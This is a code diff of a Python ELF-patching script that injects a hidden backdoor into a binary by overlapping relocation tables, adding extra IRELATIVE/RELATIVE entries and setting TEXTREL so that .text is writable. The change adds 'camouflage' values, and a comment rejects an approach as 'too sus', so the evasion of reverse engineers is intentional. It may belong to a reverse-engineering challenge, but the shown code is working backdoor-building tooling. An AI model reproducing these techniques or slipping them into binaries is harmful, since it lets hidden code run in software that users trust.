@@ -21,6 +21,7 @@ RELOC_OBF_ADDEND = 0x16493F2103392E07
 DECOY_START_TIME = 1677383997
 ACTUAL_KEY = [0x85615CE70BA97239, 0xAF6F5627BC993A1E]
 GARBAGE_CODE_SIZE = 4  # time() ptr and junk code
+RELACOUNT_TO_INCREASE = 4
 
 SYMBOL_0 = "__gmon_start__"
 SYMBOL_1 = "_ITM_registerTMCloneTable"
@@ -183,7 +184,7 @@ def shuffled(x):
     return x
 
 
-def extend_and_shift_relocation(elf: ELF):
+def extend_and_shift_relocation(elf: ELF, amount: int):
     load_segments = list(elf.load_segments)
     rela_dyn = elf.get_section_by_name(".rela.dyn")
     rela_plt = elf.get_section_by_name(".rela.plt")
@@ -201,12 +202,12 @@ def extend_and_shift_relocation(elf: ELF):
     # Assume there is no gap between .rela.dyn and .rela.plt.
     assert rela + rela_sz == jmprel
 
-    # Make RELA and JMPREL overlap: rela_sz = rela_sz + jmprel_sz
-    elf.modify_dynamic_value_by_tag("DT_RELASZ", rela_sz + jmprel_sz)
-    # Enlarge RELA by one record, move JMPREL forward; Makes the overlap off by one record, this is exactly what we want
-    elf.modify_dynamic_value_by_tag("DT_JMPREL", jmprel + ELF64_RELA_SIZE)
-    # We are going to inject one more IRELATIVE
-    elf.modify_dynamic_value_by_tag("DT_RELACOUNT", elf.dynamic_value_by_tag("DT_RELACOUNT") + 1)
+    # Make RELA and JMPREL overlap: rela_sz = rela_sz + jmprel_sz + amount x rela - 1x rela
+    elf.modify_dynamic_value_by_tag("DT_RELASZ", rela_sz + jmprel_sz + ELF64_RELA_SIZE * (amount - 1))
+    # Enlarge RELA by |amount| record, move JMPREL forward; Makes the overlap off by one record, this is exactly what we want
+    elf.modify_dynamic_value_by_tag("DT_JMPREL", jmprel + ELF64_RELA_SIZE * amount)
+    # We are going to inject |amount| more IRELATIVE
+    elf.modify_dynamic_value_by_tag("DT_RELACOUNT", elf.dynamic_value_by_tag("DT_RELACOUNT") + amount)
     # Set TEXTREL to make .text writable during relocation
     elf.modify_dynamic_value_by_tag("DT_FLAGS", elf.dynamic_value_by_tag("DT_FLAGS") | DYNAMIC_FLAGS.TEXTREL.value)
 
@@ -214,24 +215,24 @@ def extend_and_shift_relocation(elf: ELF):
     # This looks horrible, but I can't find any strictly in-place ELF manipulation library in Python.
     # (LIEF adds a brand new LOAD segment even with no changes at all, crazy)
     seg0_file_offset = elf.header.e_phoff + elf.header.e_phentsize * elf.segments.index(load_segments[0])
-    # loadable_segments[0].physical_size += ELF64_RELA_SIZE
-    # loadable_segments[0].virtual_size += ELF64_RELA_SIZE
+    # loadable_segments[0].physical_size += ELF64_RELA_SIZE * amount
+    # loadable_segments[0].virtual_size += ELF64_RELA_SIZE * amount
 
     def add(offset, addend):
         elf.p64_off(offset, elf.u64_off(offset) + addend)
 
-    add(seg0_file_offset + 32, ELF64_RELA_SIZE)
-    add(seg0_file_offset + 40, ELF64_RELA_SIZE)
+    add(seg0_file_offset + 32, ELF64_RELA_SIZE * amount)
+    add(seg0_file_offset + 40, ELF64_RELA_SIZE * amount)
 
     sec_rela_dyn_offset = elf.header.e_shoff + elf.header.e_shentsize * elf.sections.index(rela_dyn)
-    # rela_dyn.size += ELF64_RELA_SIZE
-    add(sec_rela_dyn_offset + 32, ELF64_RELA_SIZE)
+    # rela_dyn.size += ELF64_RELA_SIZE * amount
+    add(sec_rela_dyn_offset + 32, ELF64_RELA_SIZE * amount)
 
     sec_rela_plt_offset = elf.header.e_shoff + elf.header.e_shentsize * elf.sections.index(rela_plt)
-    # rela_plt.virtual_address += ELF64_RELA_SIZE
-    # rela_plt.offset += ELF64_RELA_SIZE
-    add(sec_rela_plt_offset + 16, ELF64_RELA_SIZE)
-    add(sec_rela_plt_offset + 24, ELF64_RELA_SIZE)
+    # rela_plt.virtual_address += ELF64_RELA_SIZE * amount
+    # rela_plt.offset += ELF64_RELA_SIZE * amount
+    add(sec_rela_plt_offset + 16, ELF64_RELA_SIZE * amount)
+    add(sec_rela_plt_offset + 24, ELF64_RELA_SIZE * amount)
 
 
 def assemble_shellcode(path, **constants):
@@ -270,7 +271,7 @@ stage1 = ELF("lyla.clean", checksec=False)
 original_rela = stage1.section(".rela.dyn")
 original_jmprel = stage1.section(".rela.plt")
 
-extend_and_shift_relocation(stage1)
+extend_and_shift_relocation(stage1, amount=RELACOUNT_TO_INCREASE)
 
 # Reload the file
 with tempfile.NamedTemporaryFile() as tmpf:
@@ -381,20 +382,18 @@ backdoor_reloc = hdr_gap.alloc(len(original_jmprel), "backdoor reloc").write(pac
 
 # --- First layer of decoding below
 
-stage2.p8(stage2.symtab(SYMBOL_0) + 4, (SYMBOL_BINDINGS.LOCAL.value << 4) | SYMBOL_TYPES.NOTYPE.value)
-stage2.p16(stage2.symtab(SYMBOL_0) + 6, SYMBOL_SECTION_INDEX.ABS.value)  # shndx
+# Set the size field in ELF. We could do this in reloc, but it requires using a SIZE64 rtype, which is too sus.
 stage2.p64(stage2.symtab(SYMBOL_0) + 16, len(original_jmprel) - ELF64_RELA_SIZE)  # size
 stage2.p64(stage2.symtab(SYMBOL_2) + 16, 8)  # size
 
-# Patch sh_info of .dynsym to avoid "readelf: Warning: local symbol 36 found at index >= .dynsym's sh_info value of 1"
-stage2.p32_off(
-    stage2.header.e_shoff
-    + stage2.header.e_shentsize * stage2.sections.index(stage2.get_section_by_name(".dynsym"))
-    + 44,
-    stage2.symidx[SYMBOL_0] + 1,
-)
-
-new_rela = [Relocation(stage2.symtab(SYMBOL_0) + 8, RTYPE.RELATIVE, addend=backdoor_reloc.address)]
+camouflage_hi = 0x2500 # stage2.symtab(SYMBOL_0) & 0xFF00
+new_rela = [
+    Relocation(stage2.symtab(SYMBOL_0) + 4, RTYPE.RELATIVE, addend=camouflage_hi | (SYMBOL_BINDINGS.LOCAL.value << 4) | SYMBOL_TYPES.NOTYPE.value),
+    Relocation(stage2.symtab(SYMBOL_0) + 6, RTYPE.RELATIVE, addend=camouflage_hi | (SYMBOL_SECTION_INDEX.ABS.value & 0xFF)),
+    Relocation(stage2.symtab(SYMBOL_0) + 7, RTYPE.RELATIVE, addend=camouflage_hi | (SYMBOL_SECTION_INDEX.ABS.value >> 8)),
+    Relocation(stage2.symtab(SYMBOL_0) + 8, RTYPE.RELATIVE, addend=backdoor_reloc.address),
+]
+assert len(new_rela) == RELACOUNT_TO_INCREASE
 new_rela.extend(map(Relocation.parse, lists.group(rela_dyn.header.sh_entsize, original_rela)))
 
 for i, ent in enumerate(new_rela):
